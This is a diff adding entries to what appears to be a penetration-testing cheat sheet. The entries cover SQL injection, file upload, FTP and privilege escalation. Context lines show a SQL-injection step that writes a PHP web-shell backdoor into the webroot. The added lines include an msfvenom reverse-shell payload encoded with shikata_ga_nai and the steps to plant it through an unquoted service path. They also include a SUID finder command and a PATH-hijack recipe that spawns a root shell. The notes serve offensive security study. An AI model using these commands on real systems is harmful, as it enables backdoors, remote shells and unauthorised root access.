@@ -403,6 +403,12 @@ When modifying web exploits, there are several key questions we generally need t
 - use ```load_file('C:/Windows/System32/drivers/etc/hosts')``` to load files instead of database data.
 - use ```"<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '<PATH TO WEBROOT>/backdoor.php'``` to create a simple php backdoor.
 
+### File upload
+#### File upload intruder extensions list
+```
+/opt/SecLists/Discovery/Web-Content/web-extensions.txt
+```
+
 ## FTP
 - Check if login is allowed as anonymous:anonymous.
 
@@ -528,9 +534,33 @@ powercat -l -p <PORT> -e cmd.exe
 
 # Post Exploitation
 ## Local privilege escalation
+Exploit binaries
+- Linux https://gtfobins.github.io/
+- Windows https://lolbas-project.github.io/
+
 ### Windows
+#### Powerup unqouted service path
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
+
+- Check for something we can restart and generate payload:
+- MSF venom generate exe
+  - msfvenom -p windows/shell_reverse_tcp LHOST=<HOST> LPORT=<PORT> -e x86/shikata_ga_nai -f exe -o <NAME>.exe
+- Upload to host
+- Restart service in powershell. 
+- restart-service  <SERVICE>
 
 ### Linux
+#### Find suit bits
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+
+If a binary has a SUID and doesn’t use full path for executing something, you can manipulate the path to run another binary (/bin/sh).
+- echo /bin/bash > /tmp/curl
+- chmod 777 /tmp/curl
+- export PATH=/tmp:$PATH
+- <path to binary>
+
 #### Run SUID BIT
 Use the following instead of just sudo <PROGRAM>
 ```
